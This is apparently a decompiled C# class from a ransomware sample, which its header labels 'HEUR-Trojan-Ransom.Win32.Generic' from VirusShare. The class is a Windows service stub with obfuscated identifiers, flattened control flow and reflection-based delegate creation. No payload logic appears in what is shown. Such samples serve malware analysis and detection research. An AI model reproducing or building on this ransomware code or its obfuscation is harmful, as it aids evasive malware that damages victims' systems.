// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႷႣ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace Ⴃ
{
  internal sealed class ႷႣ : ServiceBase
  {
    private IContainer Ⴀ;

    public ႷႣ() => this.Ⴃ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    [SpecialName]
    public static byte[] Ⴐ()
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      return ႣႠ.Ⴃ;
    }

    protected override void Dispose([In] bool obj0)
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      char[] ⴗ = ႷႼ.Ⴗ;
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
          case 4:
          case 6:
            goto label_5;
          case 1:
            num = this.Ⴀ == null ? (int) ⴗ[102] - 43050 : (int) ⴗ[85] - 33141;
            continue;
          case 5:
            goto label_4;
          default:
            num = !obj0 ? (int) ⴍ[176] - 13 : 1;
            continue;
        }
      }
label_4:
      this.Ⴀ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴃ()
    {
      this.Ⴀ = (IContainer) new Container();
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႳႥ.Ⴍ(2076022802, (ႳႥ) null, 8, (Assembly) null), (short) 68, ',');
      ႷႨ.Ⴐ[232] = (byte) (((int) ႷႨ.Ⴐ[232] ^ (int) ႷႨ.Ⴐ[476]) & 153);
    }

    static ႷႣ() => ႳႣ.Ⴅ();

    internal static Delegate Ⴓ<\u0021\u00210, \u0021\u00211, \u0021\u00212>(
      [In] \u0021\u00210 obj0,
      [In] \u0021\u00212 obj1,
      [In] \u0021\u00211 obj2,
      [In] char obj3,
      [In] short obj4)
      where \u0021\u00210 : Type
      where \u0021\u00211 : MethodInfo
      where \u0021\u00212 : object
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      char[] ⴗ = ႷႼ.Ⴗ;
      byte[] ⴐ = ႷႨ.Ⴐ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴗ[54] - 25728;
      ICloneable cloneable;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            cloneable = (ICloneable) null;
            num2 = 3;
            continue;
          case 1:
          case 9:
            cloneable = (ICloneable) Delegate.CreateDelegate((Type) obj0, (object) obj1, (MethodInfo) obj2);
            num2 = (int) ⴐ[41] - 130;
            continue;
          case 2:
            num2 = num3 % 2 != 0 ? 10 : 6;
            continue;
          case 3:
            ++num1;
            int num4 = (int) obj3;
            int num5 = num4 * num4;
            num3 = (int) obj3 + num5;
            num2 = 2;
            continue;
          case 4:
          case 8:
            num2 = 10;
            continue;
          case 5:
            goto label_3;
          case 6:
          case 7:
            goto label_12;
          case 10:
            int num6;
            switch (((int) obj4 ^ (int) obj3) - 107 ^ num1)
            {
              case 0:
                num6 = 1;
                break;
              default:
                num6 = 0;
                break;
            }
            num2 = num6;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.Ⴓ);
            num2 = (int) ⴍ[203] - 174;
            continue;
        }
      }
label_12:
      return (Delegate) cloneable;
    }
  }
}
